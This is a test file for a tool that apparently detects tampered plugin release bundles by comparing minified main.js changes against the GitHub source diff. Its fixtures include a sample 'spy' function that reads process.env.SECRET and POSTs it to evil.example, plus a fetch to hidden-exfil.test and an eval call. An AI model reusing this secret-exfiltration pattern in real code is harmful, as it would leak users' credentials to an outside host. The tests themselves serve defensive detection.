import {
    analyzeMainJsBundleDiff,
    detectBundleTamperMismatch,
    splitBundleStatements,
} from './bundleDiff';

describe('bundleDiff', () => {
    it('splits single-line minified bundles into comparable statement chunks', () => {
        const chunks = splitBundleStatements('var a=1;function f(){return fetch("https://a.test")};var b=2');
        expect(chunks.length).toBeGreaterThan(1);
    });

    it('detects added external hosts and sensitive APIs in minified main.js updates', () => {
        const oldBundle = `const x=1;function hello(){console.log("hi");}`;
        const newBundle = `const x=1;function hello(){console.log("hi");}async function spy(){const t=process.env.SECRET;await fetch("https://evil.example/collect",{method:"POST",body:t});}`;

        const analysis = analyzeMainJsBundleDiff(oldBundle, newBundle);
        expect(analysis.addedHosts).toEqual(['evil.example']);
        expect(analysis.addedApiSignals).toContain('fetch() (+1)');
        expect(analysis.addedApiSignals).toContain('process.env access (+1)');
        expect(analysis.addedSnippetsText).toContain('evil.example');
    });

    it('flags tamper mismatch when release main.js adds domains or APIs missing from GitHub source diff', () => {
        const oldBundle = `var a=1;`;
        const newBundle = `var a=1;fetch("https://hidden-exfil.test/drop");eval("alert(1)");`;
        const bundleAnalysis = analyzeMainJsBundleDiff(oldBundle, newBundle);

        const cleanSourceDiff = `--- src/main.ts ---\n+console.log("innocent typo fix");`;
        const warnings = detectBundleTamperMismatch(cleanSourceDiff, bundleAnalysis);

        expect(warnings).toContain(
            'Release main.js introduces external host "hidden-exfil.test" not found in GitHub source diff'
        );
        expect(warnings).toContain(
            'Release main.js adds fetch() not found in GitHub source diff'
        );
        expect(warnings).toContain(
            'Release main.js adds eval / new Function not found in GitHub source diff'
        );
    });

    it('does not flag tamper mismatch when added hosts and APIs match GitHub source diff', () => {
        const oldBundle = `var a=1;`;
        const newBundle = `var a=1;fetch("https://api.example.com/v1");`;
        const bundleAnalysis = analyzeMainJsBundleDiff(oldBundle, newBundle);

        const matchingSourceDiff = `--- src/api.ts ---\n+await fetch("https://api.example.com/v1");`;
        const warnings = detectBundleTamperMismatch(matchingSourceDiff, bundleAnalysis);

        expect(warnings).toEqual([]);
    });
});
